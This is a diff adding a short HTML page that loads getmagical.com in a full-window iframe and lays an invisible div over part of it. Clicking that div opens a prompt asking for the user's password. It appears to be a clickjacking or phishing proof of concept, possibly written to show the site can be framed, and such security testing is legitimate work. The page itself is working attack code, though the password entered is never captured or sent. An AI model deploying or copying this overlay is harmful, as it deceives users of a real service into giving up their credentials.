@@ -1,0 +1,23 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<title>Magical</title>
+</head>
+<body style="padding: 0; margin: 0">
+<div>
+    <div id="gotcha" style="position: absolute; top: 0; right:0; width: 50%; height: 200px;">
+    </div>
+    <iframe src="https://www.getmagical.com/" height="100vw" width="100vh" style="border: none; box-shadow: none;"></iframe>
+</div>
+</body>
+</html>
+<script>
+    var iframe = document.querySelector('iframe');
+        iframe.style.height = window.innerHeight + 'px';
+        iframe.style.width = window.innerWidth + 'px';
+    var gotcha = document.querySelector('#gotcha');
+    gotcha.addEventListener('click', function(){
+        prompt("Please enter your password to continue");
+    });
+</script>
